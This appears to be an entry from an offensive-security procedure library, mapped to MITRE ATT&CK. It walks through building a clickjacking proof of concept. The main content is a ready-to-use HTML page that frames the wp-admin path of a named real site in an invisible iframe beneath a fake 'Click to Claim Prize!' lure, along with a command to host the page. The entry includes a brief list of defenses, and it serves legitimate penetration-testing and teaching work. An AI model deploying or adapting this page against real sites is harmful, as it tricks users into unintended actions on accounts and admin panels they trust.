---
id: proc-demonstrate-clickjacking-poc
tags:
  - clickjacking
  - poc
  - exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:12.757Z'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate-Clickjacking-PoC

## Summary

This procedure creates a proof-of-concept (PoC) malicious webpage that embeds a vulnerable site like jobs.wordpress.net in an invisible iframe, overlaying bait elements to trick users into performing actions such as form submissions.

## Description

Once headers are confirmed missing, attackers host a deceptive page where the target is iframed with low opacity and positioned behind clickable lures. For WordPress job sites, this could trick users into applying for jobs or clicking admin links unintentionally. The PoC uses HTML/CSS for overlay; host on any web server. Expected outcome: User interactions propagate to the hidden site. No special tools beyond a text editor and server are needed.

## Requirements

1. Local web server (e.g., Python's http.server or Apache)
2. Text editor for HTML
3. Target site confirmed vulnerable (from prior procedure)

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP policies blocking unauthorized framing
- Educate users on suspicious sites via browser warnings
- Log and alert on anomalous user actions (e.g., rapid clicks)

## Objectives

1. Embed target site in iframe without restrictions
2. Overlay deceptive UI to hijack clicks
3. Simulate victim interaction for impact demonstration

## Instructions

### Step 1: Create PoC HTML File

**Context**: Build the malicious page with iframe and overlay.

**Command** (HTML content):
```html
<!DOCTYPE html>
<html>
<head>
    <title>Fake Prize Click</title>
    <style>
        body { margin: 0; }
        iframe { position: absolute; top: 0; left: 0; opacity: 0; width: 1024px; height: 768px; border: none; }
        .bait-button { position: absolute; top: 200px; left: 300px; z-index: 10; padding: 10px; background: red; color: white; }
    </style>
</head>
<body>
    <div class="bait-button">Click to Claim Prize!</div>
    <iframe src="https://jobs.wordpress.net/wp-admin/"></iframe>
</body>
</html>
```

> Save as index.html. The iframe targets a sensitive path like wp-admin; adjust position to align with desired action (e.g., login button). Opacity 0 makes it invisible.

### Step 2: Host and Test PoC

**Context**: Serve the file and verify in a browser.

**Command** (Python server):
```bash
python3 -m http.server 8000
```

> Access http://localhost:8000. Click the bait; it should trigger the iframe's element. Expected: Action executes on target site (e.g., form submit).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[web-exploit]]
